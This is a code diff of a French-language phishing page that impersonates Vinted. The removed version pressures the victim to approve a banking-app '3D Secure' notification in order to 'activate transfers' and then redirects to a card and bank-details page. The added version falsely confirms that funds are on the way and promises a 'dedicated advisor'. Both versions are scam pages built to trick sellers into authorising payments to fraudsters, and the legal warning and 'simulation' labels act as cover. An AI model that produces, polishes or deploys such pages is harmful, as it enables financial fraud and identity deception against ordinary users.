@@ -1,291 +1,96 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validation de Sécurité - Vinted</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            color: #333;
-            text-align: center;
-        }
-        .container {
-            background-color: #ffffff;
-            padding: 25px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 550px;
-            box-sizing: border-box;
-            margin: 15px;
-        }
-        .logo {
-            margin-bottom: 20px;
-        }
-        .logo img {
-            max-width: 110px;
-            height: auto;
-            border: 0;
-        }
-        h2 {
-            font-size: 22px;
-            color: #007b76;
-            margin-bottom: 15px;
-            font-weight: 500;
-        }
-        p {
-            font-size: 0.95em;
-            line-height: 1.5;
-            color: #555;
-            margin-bottom: 10px;
-            text-align: justify; /* Pour mieux intégrer les puces */
-        }
-        .highlight-text {
-            color: #007b76;
-            font-weight: bold;
-        }
-        .simulation-section {
-            background-color: #f9f9f9;
-            border: 1px solid #eee;
-            border-radius: 5px;
-            padding: 15px;
-            margin-bottom: 15px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-        }
-        .simulation-label {
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 5px;
-        }
-        .request-simulation-btn {
-            padding: 10px 20px;
-            background-color: #007b76;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        .request-simulation-btn:hover:not(:disabled) {
-            background-color: #005e5a;
-        }
-        .request-simulation-btn:disabled {
-            background-color: #a0a0a0;
-            cursor: not-allowed;
-        }
-        .simulation-feedback {
-            margin-top: 5px;
-            font-size: 0.9em;
-            color: #555;
-            min-height: 20px;
-        }
-        .feedback-message {
-            color: #28a745;
-            font-weight: bold;
-        }
-        .feedback-countdown {
-            color: #dc3545;
-            font-weight: bold;
-        }
-        .final-button {
-            display: inline-block;
-            padding: 10px 20px;
-            background-color: #007b76;
-            color: white;
-            text-decoration: none;
-            border-radius: 4px;
-            font-weight: bold;
-            font-size: 0.95em;
-            margin-top: 25px;
-            transition: background-color 0.3s ease;
-            cursor: pointer;
-            border: none;
-        }
-        .final-button:hover:not(:disabled) {
-            background-color: #005e5a;
-        }
-        .final-button:disabled {
-            background-color: #a0a0a0;
-            cursor: not-allowed;
-        }
-        .final-message {
-            margin-top: 20px;
-            font-size: 1.1em;
-            color: #007b76;
-            font-weight: bold;
-        }
-        .legal-warning {
-            background-color: #ffebe6;
-            border: 1px solid #dc3545;
-            border-radius: 5px;
-            padding: 12px;
-            margin-top: 20px;
-            text-align: left;
-            font-size: 0.8em;
-            color: #dc3545;
-        }
-        .legal-warning strong {
-            font-size: 1em;
-            display: block;
-            margin-bottom: 6px;
-        }
-        .bullet-list { /* Style spécifique pour la liste condensée */
-            list-style-type: none;
-            padding-left: 0;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        .bullet-list li {
-            margin-bottom: 8px;
-            font-size: 0.95em;
-            color: #555;
-            line-height: 1.5;
-            position: relative;
-            padding-left: 20px;
-        }
-        .bullet-list li::before {
-            content: "•";
-            color: #007b76;
-            font-weight: bold;
-            display: inline-block;
-            width: 1em;
-            margin-left: -1em;
-            position: absolute;
-            left: 0;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vérification approuvée - Vinted</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+    body {
+        font-family: 'Roboto', Arial, sans-serif;
+        background-color: #f0f2f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        color: #333;
+        text-align: center;
+    }
 
+    .container {
+        background-color: #fff;
+        padding: 40px;
+        border-radius: 12px;
+        box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+        width: 100%;
+        max-width: 600px;
+        box-sizing: border-box;
+        animation: fadeIn 0.8s ease-in-out;
+    }
 
-        /* Ajustements responsifs */
-        @media (max-width: 600px) {
-            .container {
-                margin: 10px;
-                padding: 18px;
-            }
-            h2 {
-                font-size: 18px;
-            }
-            p {
-                font-size: 0.9em;
-            }
-            .legal-warning {
-                font-size: 0.75em;
-            }
-            .final-button, .request-simulation-btn {
-                font-size: 0.9em;
-                padding: 8px 15px;
-            }
-        }
-    </style>
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+        color: #007b76;
+        font-size: 1.8em;
+        margin-bottom: 20px;
+    }
+
+    .success-icon {
+        font-size: 60px;
+        color: #00b894;
+        margin-bottom: 20px;
+        animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+        0% { transform: scale(1); opacity: 1; }
+        50% { transform: scale(1.1); opacity: 0.8; }
+        100% { transform: scale(1); opacity: 1; }
+    }
+
+    .message {
+        font-size: 1.1em;
+        line-height: 1.7;
+        margin-bottom: 25px;
+        color: #444;
+    }
+
+    .highlight {
+        color: #007b76;
+        font-weight: 600;
+    }
+
+    footer {
+        margin-top: 30px;
+        font-size: 0.85em;
+        color: #777;
+    }
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
-        </div>
-        <h2>Validation de Sécurité 3D Secure (Anti-Fraude)</h2>
+<div class="container">
+    <div class="success-icon">✅</div>
+    <h2>Vérification approuvée avec succès</h2>
 
-        <p>Pour confirmer votre identité et activer les virements, Vinted procède à une Authentification Forte (obligatoire).</p>
+    <p class="message">
+        Félicitations ! Votre vérification vient d’être <span class="highlight">validée</span>.
+        Vos fonds sont désormais <span class="highlight">en cours de transfert</span>.
+        Votre conseiller dédié vous accompagnera très prochainement afin de finaliser la réception sécurisée de vos fonds.
+    </p>
 
-        <p style="font-weight: bold; margin-bottom: 10px; color: #007b76; text-align: center;">Action Requise :</p>
-        <ul class="bullet-list">
-            <li>Consultez immédiatement l'application mobile de votre banque ou vos SMS.</li>
-            <li>Une notification de "vérification de sécurité" vous a été envoyée.</li>
-            <li>Il est essentiel de valider cette demande pour confirmer l'appartenance de vos coordonnées et finaliser la transaction.</li>
-        </ul>
+    <p class="message">
+        Cette vérification ne devra être effectuée qu’<span class="highlight">une seule fois</span>.
+        Pour vos prochaines ventes, toutes les transactions et transferts s’effectueront directement depuis votre <span class="highlight">application Vinted</span>, de façon instantanée et entièrement sécurisée.
+    </p>
 
-        <p class="highlight-text" style="text-align: center;">👉 Ayez votre application bancaire à portée de main.</p>
-        <div class="simulation-list" style="margin-top: 25px;">
-            <div class="simulation-section" id="sim-1">
-                <p class="simulation-label">Authentification Forte 3D Secure Requise</p>
-                <button class="request-simulation-btn" data-simulation-id="1">Envoyer la notification de validation</button>
-                <div class="simulation-feedback" id="feedback-sim-1">
-                    <span class="feedback-message"></span>
-                    <span class="feedback-countdown"></span>
-                </div>
-            </div>
-        </div>
-
-        <div class="legal-warning">
-            <strong>AVERTISSEMENT LÉGAL : Utilisation Frauduleuse</strong>
-            <p>L'utilisation de moyens de paiement (cartes bancaires, identifiants) sans consentement est interdite et constitue une fraude, sévèrement punie par la loi (articles L. 163-1 et s. du Code monétaire et financier ; articles 313-1 et s. du Code pénal). N'utilisez que vos propres informations ou celles pour lesquelles vous avez une autorisation légale explicite.</p>
-        </div>
-
-        <button id="finalButton" class="final-button">J'ai validé la demande</button>
-        <p id="finalMessage" class="final-message" style="display: none;">Votre compte est vérifié, votre virement vous sera envoyé dans un délai de 24 heures.</p>
-    </div>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-
-            const finalButton = document.getElementById('finalButton');
-
-            // Fonction de simulation
-            function startSimulation(simulationId) {
-                const feedbackDiv = document.getElementById(`feedback-sim-${simulationId}`);
-                const messageSpan = feedbackDiv.querySelector('.feedback-message');
-                const countdownSpan = feedbackDiv.querySelector('.feedback-countdown');
-                const requestButton = document.querySelector(`.request-simulation-btn[data-simulation-id="${simulationId}"]`);
-
-                // Le bouton final n'est plus désactivé ici (il reste cliquable pour la redirection)
-
-                messageSpan.textContent = "Validation envoyée sur votre application bancaire ou par SMS...";
-                countdownSpan.textContent = "";
-                requestButton.disabled = true;
-
-                let timeLeft = 30;
-                countdownSpan.textContent = `(reste ${timeLeft}s)`;
-
-                const timer = setInterval(() => {
-                    timeLeft--;
-                    if (timeLeft <= 0) {
-                        clearInterval(timer);
-                        countdownSpan.textContent = "";
-                        messageSpan.textContent = "Validation envoyée. Veuillez confirmer sur votre application.";
-                    } else {
-                        countdownSpan.textContent = `(reste ${timeLeft}s)`;
-                    }
-                }, 1000);
-            }
-
-            const requestButtons = document.querySelectorAll('.request-simulation-btn');
-            requestButtons.forEach(button => {
-
-                button.addEventListener('click', () => {
-                    if(button.disabled) return;
-
-                    const simulationId = button.dataset.simulationId;
-                    startSimulation(simulationId);
-                });
-            });
-
-            // GESTION DU CLIC SUR LE BOUTON FINAL (AJOUT DE LA REDIRECTION)
-            const finalMessage = document.getElementById('finalMessage');
-
-            finalButton.addEventListener('click', (e) => {
-                e.preventDefault(); // Empêche l'action par défaut du bouton
-
-                // Changement de l'état du bouton
-                finalButton.disabled = true;
-                finalButton.textContent = "Redirection en cours...";
-                finalMessage.style.display = 'block';
-
-                // LIGNE CORRIGÉE : Redirection vers verification_rib_cb.html
-                window.location.href = "/verification-rib-cb";
-            });
-        });
-    </script>
+    <footer>
+        <p>&copy; 2025 Vinted — La sécurité avant tout.</p>
+    </footer>
+</div>
 </body>
 </html>
